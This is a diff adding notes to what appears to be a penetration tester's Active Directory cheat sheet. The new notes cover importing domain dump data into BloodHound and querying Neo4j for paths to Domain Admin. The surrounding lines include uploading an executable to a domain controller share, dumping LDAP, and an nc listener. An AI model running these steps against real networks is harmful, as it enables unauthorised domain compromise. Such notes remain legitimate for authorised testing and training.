@@ -98,6 +98,32 @@ smbclient //dc.testad.local/share -c 'put definitely_not_malicious.exe' -U admin
 #Dump all available info from LDAP for example to process with Bloodhound
 ldapsearch -x -H ldap://10.10.20.1 -b 'dc=testad,dc=local' -D 'cn=someuser,ou=users,dc=testad,dc=local' -W -z 9999999 > ldap_dump.ldif
 
+#Import the AD data to your offensive host from the target host, should be located on the user's desktop named something along the lines of:
+#ad_dump_YYYYMMDDHHmmSS.zip
+#To import, you first need to start Neo4J (included with BloodHound when installed with APT in Kali at least) sudo systemctl start neo4j
+#After Neo4J is booted up follow the link provided by the startup process to access the local web instance and login (default creds: neo4j/neo4j)
+#Next we can start bloodhound
+bloodhound
+#Bloodhound should detect your Neo service address and prompt you for the credentials and then you get to importing the zip
+
+#Keep refreshing database stats until it looks like all is populated (might take a while if a big AD environ)
+
+#Manual queries:
+#Listing all computers:
+#MATCH (m:Computer) RETURN m
+#Listing the users:
+#MATCH (m:User) RETURN m
+#Remember to check the prebuilt queries under the Analysis section and mark owned hosts/users, some worth checking:
+#	-Find all Domain Admins
+#	-Find Computers where Domain Users are Local Admin
+#	-Find Workstations where Domain Users can RDP
+#	-Find Servers where Domain Users can RDP
+#	-Find Shortest Paths to Domain Admins
+#	-Find Shortest Path to Domain Admins from Owned Principals (for this you need to mark the owned hosts/users
+#	 You can also mark something owned to see what potential it would provide if you'd own it
+#Check for users with active session
+#MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
+
 ##Quick spawn a "web server"
 python3 -m http.server 1234
 nc -lnvp 1234
